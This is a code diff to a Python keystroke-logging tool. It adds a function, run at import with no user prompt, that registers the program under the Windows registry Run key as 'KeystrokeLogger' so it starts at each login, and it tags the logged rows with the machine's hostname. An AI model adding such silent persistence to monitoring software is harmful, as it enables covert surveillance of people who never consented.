@@ -9,8 +9,20 @@ import os
 from tkinter import messagebox
 import pystray
 from PIL import Image, ImageDraw
+import winreg, sys
+import socket
 
 
+
+def add_to_startup():
+    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r"Software\Microsoft\Windows\CurrentVersion\Run",
+                         0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, "KeystrokeLogger", 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(key)
+
+add_to_startup()
 
 
 def categorize(key):
@@ -33,6 +45,9 @@ def categorize(key):
 
 class Simplekeylog:
 	def __init__(self, out_dir = "simple_data", window_sec = 15):
+		#for getting host name
+		self.hostname = socket.gethostname()
+		#session id
 		self.session_id = str(uuid.uuid4())[:8]
 		self.out_dir = Path(out_dir)
 		self.out_dir.mkdir(exist_ok=True)
@@ -106,6 +121,7 @@ class Simplekeylog:
 
 		row = {
 			"session": self.session_id,
+			"hostname": self.hostname,
 			"time_now": now,
 			"total_press": self.total_press,
 			"total_release": self.total_release,
